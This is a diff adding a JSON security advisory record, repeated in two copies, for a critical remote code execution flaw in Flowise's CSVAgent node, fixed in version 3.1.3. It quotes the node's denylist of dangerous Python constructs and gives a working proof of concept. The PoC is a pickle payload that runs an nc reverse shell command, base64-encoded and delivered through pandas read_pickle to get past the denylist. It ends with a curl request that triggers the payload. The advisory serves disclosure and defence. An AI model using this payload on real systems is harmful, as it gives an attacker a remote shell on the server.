@@ -1,0 +1,116 @@
+{
+  "global": {
+    "cve_id": "CVE-2026-69256",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": 0,
+        "vector_string": null
+      },
+      "cvss_v4": {
+        "score": 9.4,
+        "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H"
+      }
+    },
+    "cwe_ids": [
+      "CWE-94"
+    ],
+    "description": "### Summary\n\nThe CSVAgent node was observed to allow users to write Python code which gets executed via `pyodide`. The original intent was to allow users to utilise the `pandas` library for CSV processing. Although there is a denylist that checks for dangerous Python constructs from being passed in, `pandas` has a `read_pickle()` [function](https://pandas.pydata.org/docs/reference/api/pandas.read_pickle.html) that deserialises a pickled payload and this can be leveraged to achieve code execution.\n\n### Details\n\nThe affected file is the `CSVAgent` node, found in: `flowise-components/nodes/agents/CSVAgent/CSVAgent.ts`.\n\n```js\ntry {\n    const code = `import pandas as pd\nimport base64\nfrom io import StringIO\nimport json\n\nbase64_string = \"${base64String}\"\n\ndecoded_data = base64.b64decode(base64_string)\n\ncsv_data = StringIO(decoded_data.decode('utf-8'))\n\ndf = pd.${customReadCSVFunc} <1>\nmy_dict = df.dtypes.astype(str).to_dict()\nprint(my_dict)\njson.dumps(my_dict)`\n    dataframeColDict = await pyodide.runPythonAsync(code)\n} catch (error) {\n    throw new Error(error)\n}\n```\n\nAt <1>, the `customReadCSVFunc` is supplied by the user. This input goes through input validation that denies dangerous Python constructs from being passed in:\n\n```py\nconst FORBIDDEN_PATTERNS: Array<{ pattern: RegExp; reason: string }> = [\n    // Imports (the executor pre-imports pandas and numpy; LLM code must not add any imports)\n    { pattern: /\\bfrom\\s+\\S+\\s+import\\b/g, reason: 'import statement (from...import)' },\n    { pattern: /\\bimport\\b/g, reason: 'import statement (all imports forbidden; pandas and numpy are pre-imported by the executor)' },\n    // Dangerous builtins\n    { pattern: /\\beval\\s*\\(/g, reason: 'eval()' },\n    { pattern: /\\bexec\\s*\\(/g, reason: 'exec()' },\n    { pattern: /\\bcompile\\s*\\(/g, reason: 'compile()' },\n    { pattern: /\\b__import__\\s*\\(/g, reason: '__import__()' },\n    { pattern: /\\bopen\\s*\\(/g, reason: 'open()' },\n    { pattern: /\\bbreakpoint\\s*\\(/g, reason: 'breakpoint()' },\n    { pattern: /\\binput\\s*\\(/g, reason: 'input()' },\n    { pattern: /\\braw_input\\s*\\(/g, reason: 'raw_input()' },\n    { pattern: /\\bglobals\\s*\\(/g, reason: 'globals()' },\n    { pattern: /\\blocals\\s*\\(/g, reason: 'locals()' },\n    { pattern: /\\bgetattr\\s*\\(/g, reason: 'getattr()' },\n    { pattern: /\\bsetattr\\s*\\(/g, reason: 'setattr()' },\n    { pattern: /\\bdelattr\\s*\\(/g, reason: 'delattr()' },\n    { pattern: /\\breload\\s*\\(/g, reason: 'reload()' },\n    { pattern: /\\bfile\\s*\\(/g, reason: 'file()' },\n    { pattern: /\\bexecfile\\s*\\(/g, reason: 'execfile()' },\n    // Dangerous modules / attributes\n    { pattern: /\\bos\\./g, reason: 'os module' },\n    { pattern: /\\bsubprocess\\./g, reason: 'subprocess module' },\n    { pattern: /\\bsys\\./g, reason: 'sys module' },\n    { pattern: /\\bsocket\\./g, reason: 'socket module' },\n    { pattern: /\\burllib\\./g, reason: 'urllib module' },\n    { pattern: /\\brequests\\./g, reason: 'requests module' },\n    { pattern: /\\b__builtins__\\b/g, reason: '__builtins__' },\n    { pattern: /\\b__loader__\\b/g, reason: '__loader__' },\n    { pattern: /\\b__spec__\\b/g, reason: '__spec__' },\n    { pattern: /\\b__class__\\b/g, reason: '__class__ (reflection)' },\n    { pattern: /\\b__subclasses__\\s*\\(/g, reason: '__subclasses__()' },\n    { pattern: /\\b__bases__\\b/g, reason: '__bases__' },\n    { pattern: /\\b__mro__\\b/g, reason: '__mro__' },\n    { pattern: /\\b__globals__\\b/g, reason: '__globals__' },\n    { pattern: /\\b__code__\\b/g, reason: '__code__' },\n    { pattern: /\\b__closure__\\b/g, reason: '__closure__' },\n    { pattern: /\\bvars\\s*\\(/g, reason: 'vars()' },\n    { pattern: /\\bdir\\s*\\(/g, reason: 'dir()' },\n    { pattern: /\\b__dict__\\b/g, reason: '__dict__ (attribute reflection)' },\n    { pattern: /\\b__module__\\b/g, reason: '__module__ (module reflection)' }\n]\n```\n\nHowever, by using `pandas.read_pickle()`, an attacker can achieve code execution without hitting any of the denied words.\n\n### PoC\n\nFirst, generate a pickled payload that performs an OS command (replace the IP and port with your listening IP and port):\n\n```py\nimport pickle\nimport base64\nimport os\n\nclass Exploit:\n    def __reduce__(self):\n        return (os.system, (\"/usr/bin/nc 172.17.0.1 13337 -e /bin/sh\",))\n\npayload = pickle.dumps(Exploit())\nencoded = base64.b64encode(payload).decode()\nprint(encoded)\n```\n\nRun it and note the encoded payload to be used later:\n\n```bash\n$ python3 pickle-payload-poc.py\n\ngASVQgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjCcvdXNyL2Jpbi9uYyAxNzIuMTcuMC4xIDEzMzM3IC1lIC9iaW4vc2iUhZRSlC4=\n```\n\n1. In the Flowise dashboard, navigate to Chatflows and create or modify an existing Chatflow.\n2. Drag a \"CSV Agent\" node onto the canvas.\n3. Click on \"Additional Parameters\" and fill in the following PoC:\n\n```py\nisnull(\"\")\nclass MiniBytesIO:\n    def __init__(self, b):\n        self.data = b\n        self.pos = 0\n    def read(self, n=-1):\n        if n == -1:\n            n = len(self.data) - self.pos\n        chunk = self.data[self.pos:self.pos+n]\n        self.pos += n\n        return chunk\n    def readline(self, n=-1):\n        if self.pos >= len(self.data):\n            return b\"\"\n        next_nl = self.data.find(b\"\\\\n\", self.pos)\n        if next_nl == -1:\n            next_nl = len(self.data)\n        if n != -1:\n            next_nl = min(self.pos + n, next_nl)\n        line = self.data[self.pos:next_nl+1]\n        self.pos = next_nl + 1\n        return line\npd.read_pickle(MiniBytesIO(base64.b64decode(\"gASVQgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjCcvdXNyL2Jpbi9uYyAxNzIuMTcuMC4xIDEzMzM3IC1lIC9iaW4vc2iUhZRSlC4=\")))\n```\n\nThe custom `MiniBytesIO` class  needs to be included in order to deserialise the pickled payload, since `read_pickle()` expects a \"str, path object, or file-like object\". This is because we cannot use `import` to import `BytesIO`, nor `open()` to write to disk and read, and entering a URL does not work due to `pyodide` not having raw socket capabilities.\n\nSave the chatflow, and obtain the UUID of this chatflow from the URL `/canvas/<UUID>`.\n\nOpen a listening shell on your specified port from your listening host, and send a POST request to the chatflow to trigger it and achieve code execution:\n\n```\n$ curl -X POST http://<TARGET>/api/v1/prediction/<UUID>\n```",
+    "ghsa_id": "GHSA-x6vm-w76m-8j7g",
+    "html_url": "https://github.com/advisories/GHSA-x6vm-w76m-8j7g",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-x6vm-w76m-8j7g"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-69256"
+      }
+    ],
+    "published_at": "2026-08-04T15:46:20Z",
+    "references": [
+      "https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-x6vm-w76m-8j7g",
+      "https://github.com/FlowiseAI/Flowise/pull/6257",
+      "https://github.com/FlowiseAI/Flowise/commit/c79fe56a6c249850e96bce9b4859f7a0083e4507",
+      "https://github.com/FlowiseAI/Flowise/releases/tag/flowise@3.1.3",
+      "https://github.com/advisories/GHSA-x6vm-w76m-8j7g"
+    ],
+    "severity": "critical",
+    "summary": "Flowise: Remote Code Execution Vulnerability in CSVAgent",
+    "updated_at": "2026-08-04T17:47:31Z",
+    "vulnerabilities": [
+      {
+        "first_patched_version": "3.1.3",
+        "package": {
+          "ecosystem": "npm",
+          "name": "flowise-components"
+        },
+        "vulnerable_version_range": "<= 3.1.2"
+      },
+      {
+        "first_patched_version": "3.1.3",
+        "package": {
+          "ecosystem": "npm",
+          "name": "flowise"
+        },
+        "vulnerable_version_range": "<= 3.1.2"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "id": "GHSA-x6vm-w76m-8j7g",
+  "repo": {
+    "cve_id": "CVE-2026-69256",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": null,
+        "vector_string": null
+      },
+      "cvss_v4": {
+        "score": 9.4,
+        "vector_string": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H"
+      }
+    },
+    "cwe_ids": [
+      "CWE-94"
+    ],
+    "description": "### Summary\r\n\r\nThe CSVAgent node was observed to allow users to write Python code which gets executed via `pyodide`. The original intent was to allow users to utilise the `pandas` library for CSV processing. Although there is a denylist that checks for dangerous Python constructs from being passed in, `pandas` has a `read_pickle()` [function](https://pandas.pydata.org/docs/reference/api/pandas.read_pickle.html) that deserialises a pickled payload and this can be leveraged to achieve code execution.\r\n\r\n### Details\r\n\r\nThe affected file is the `CSVAgent` node, found in: `flowise-components/nodes/agents/CSVAgent/CSVAgent.ts`.\r\n\r\n```js\r\ntry {\r\n    const code = `import pandas as pd\r\nimport base64\r\nfrom io import StringIO\r\nimport json\r\n\r\nbase64_string = \"${base64String}\"\r\n\r\ndecoded_data = base64.b64decode(base64_string)\r\n\r\ncsv_data = StringIO(decoded_data.decode('utf-8'))\r\n\r\ndf = pd.${customReadCSVFunc} <1>\r\nmy_dict = df.dtypes.astype(str).to_dict()\r\nprint(my_dict)\r\njson.dumps(my_dict)`\r\n    dataframeColDict = await pyodide.runPythonAsync(code)\r\n} catch (error) {\r\n    throw new Error(error)\r\n}\r\n```\r\n\r\nAt <1>, the `customReadCSVFunc` is supplied by the user. This input goes through input validation that denies dangerous Python constructs from being passed in:\r\n\r\n```py\r\nconst FORBIDDEN_PATTERNS: Array<{ pattern: RegExp; reason: string }> = [\r\n    // Imports (the executor pre-imports pandas and numpy; LLM code must not add any imports)\r\n    { pattern: /\\bfrom\\s+\\S+\\s+import\\b/g, reason: 'import statement (from...import)' },\r\n    { pattern: /\\bimport\\b/g, reason: 'import statement (all imports forbidden; pandas and numpy are pre-imported by the executor)' },\r\n    // Dangerous builtins\r\n    { pattern: /\\beval\\s*\\(/g, reason: 'eval()' },\r\n    { pattern: /\\bexec\\s*\\(/g, reason: 'exec()' },\r\n    { pattern: /\\bcompile\\s*\\(/g, reason: 'compile()' },\r\n    { pattern: /\\b__import__\\s*\\(/g, reason: '__import__()' },\r\n    { pattern: /\\bopen\\s*\\(/g, reason: 'open()' },\r\n    { pattern: /\\bbreakpoint\\s*\\(/g, reason: 'breakpoint()' },\r\n    { pattern: /\\binput\\s*\\(/g, reason: 'input()' },\r\n    { pattern: /\\braw_input\\s*\\(/g, reason: 'raw_input()' },\r\n    { pattern: /\\bglobals\\s*\\(/g, reason: 'globals()' },\r\n    { pattern: /\\blocals\\s*\\(/g, reason: 'locals()' },\r\n    { pattern: /\\bgetattr\\s*\\(/g, reason: 'getattr()' },\r\n    { pattern: /\\bsetattr\\s*\\(/g, reason: 'setattr()' },\r\n    { pattern: /\\bdelattr\\s*\\(/g, reason: 'delattr()' },\r\n    { pattern: /\\breload\\s*\\(/g, reason: 'reload()' },\r\n    { pattern: /\\bfile\\s*\\(/g, reason: 'file()' },\r\n    { pattern: /\\bexecfile\\s*\\(/g, reason: 'execfile()' },\r\n    // Dangerous modules / attributes\r\n    { pattern: /\\bos\\./g, reason: 'os module' },\r\n    { pattern: /\\bsubprocess\\./g, reason: 'subprocess module' },\r\n    { pattern: /\\bsys\\./g, reason: 'sys module' },\r\n    { pattern: /\\bsocket\\./g, reason: 'socket module' },\r\n    { pattern: /\\burllib\\./g, reason: 'urllib module' },\r\n    { pattern: /\\brequests\\./g, reason: 'requests module' },\r\n    { pattern: /\\b__builtins__\\b/g, reason: '__builtins__' },\r\n    { pattern: /\\b__loader__\\b/g, reason: '__loader__' },\r\n    { pattern: /\\b__spec__\\b/g, reason: '__spec__' },\r\n    { pattern: /\\b__class__\\b/g, reason: '__class__ (reflection)' },\r\n    { pattern: /\\b__subclasses__\\s*\\(/g, reason: '__subclasses__()' },\r\n    { pattern: /\\b__bases__\\b/g, reason: '__bases__' },\r\n    { pattern: /\\b__mro__\\b/g, reason: '__mro__' },\r\n    { pattern: /\\b__globals__\\b/g, reason: '__globals__' },\r\n    { pattern: /\\b__code__\\b/g, reason: '__code__' },\r\n    { pattern: /\\b__closure__\\b/g, reason: '__closure__' },\r\n    { pattern: /\\bvars\\s*\\(/g, reason: 'vars()' },\r\n    { pattern: /\\bdir\\s*\\(/g, reason: 'dir()' },\r\n    { pattern: /\\b__dict__\\b/g, reason: '__dict__ (attribute reflection)' },\r\n    { pattern: /\\b__module__\\b/g, reason: '__module__ (module reflection)' }\r\n]\r\n```\r\n\r\nHowever, by using `pandas.read_pickle()`, an attacker can achieve code execution without hitting any of the denied words.\r\n\r\n### PoC\r\n\r\nFirst, generate a pickled payload that performs an OS command (replace the IP and port with your listening IP and port):\r\n\r\n```py\r\nimport pickle\r\nimport base64\r\nimport os\r\n\r\nclass Exploit:\r\n    def __reduce__(self):\r\n        return (os.system, (\"/usr/bin/nc 172.17.0.1 13337 -e /bin/sh\",))\r\n\r\npayload = pickle.dumps(Exploit())\r\nencoded = base64.b64encode(payload).decode()\r\nprint(encoded)\r\n```\r\n\r\nRun it and note the encoded payload to be used later:\r\n\r\n```bash\r\n$ python3 pickle-payload-poc.py\r\n\r\ngASVQgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjCcvdXNyL2Jpbi9uYyAxNzIuMTcuMC4xIDEzMzM3IC1lIC9iaW4vc2iUhZRSlC4=\r\n```\r\n\r\n1. In the Flowise dashboard, navigate to Chatflows and create or modify an existing Chatflow.\r\n2. Drag a \"CSV Agent\" node onto the canvas.\r\n3. Click on \"Additional Parameters\" and fill in the following PoC:\r\n\r\n```py\r\nisnull(\"\")\r\nclass MiniBytesIO:\r\n    def __init__(self, b):\r\n        self.data = b\r\n        self.pos = 0\r\n    def read(self, n=-1):\r\n        if n == -1:\r\n            n = len(self.data) - self.pos\r\n        chunk = self.data[self.pos:self.pos+n]\r\n        self.pos += n\r\n        return chunk\r\n    def readline(self, n=-1):\r\n        if self.pos >= len(self.data):\r\n            return b\"\"\r\n        next_nl = self.data.find(b\"\\\\n\", self.pos)\r\n        if next_nl == -1:\r\n            next_nl = len(self.data)\r\n        if n != -1:\r\n            next_nl = min(self.pos + n, next_nl)\r\n        line = self.data[self.pos:next_nl+1]\r\n        self.pos = next_nl + 1\r\n        return line\r\npd.read_pickle(MiniBytesIO(base64.b64decode(\"gASVQgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjCcvdXNyL2Jpbi9uYyAxNzIuMTcuMC4xIDEzMzM3IC1lIC9iaW4vc2iUhZRSlC4=\")))\r\n```\r\n\r\nThe custom `MiniBytesIO` class  needs to be included in order to deserialise the pickled payload, since `read_pickle()` expects a \"str, path object, or file-like object\". This is because we cannot use `import` to import `BytesIO`, nor `open()` to write to disk and read, and entering a URL does not work due to `pyodide` not having raw socket capabilities.\r\n\r\nSave the chatflow, and obtain the UUID of this chatflow from the URL `/canvas/<UUID>`.\r\n\r\nOpen a listening shell on your specified port from your listening host, and send a POST request to the chatflow to trigger it and achieve code execution:\r\n\r\n```\r\n$ curl -X POST http://<TARGET>/api/v1/prediction/<UUID>\r\n```\r\n",
+    "ghsa_id": "GHSA-x6vm-w76m-8j7g",
+    "html_url": "https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-x6vm-w76m-8j7g",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-x6vm-w76m-8j7g"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-69256"
+      }
+    ],
+    "published_at": "2026-07-29T21:04:08Z",
+    "references": [],
+    "severity": "critical",
+    "summary": "Remote Code Execution Vulnerability in CSVAgent",
+    "updated_at": "2026-08-04T15:44:49Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "flowise-components"
+        },
+        "patched_versions": "3.1.3",
+        "vulnerable_version_range": "<= 3.1.2"
+      },
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "flowise"
+        },
+        "patched_versions": "3.1.3",
+        "vulnerable_version_range": "<= 3.1.2"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "FlowiseAI/Flowise"
+}
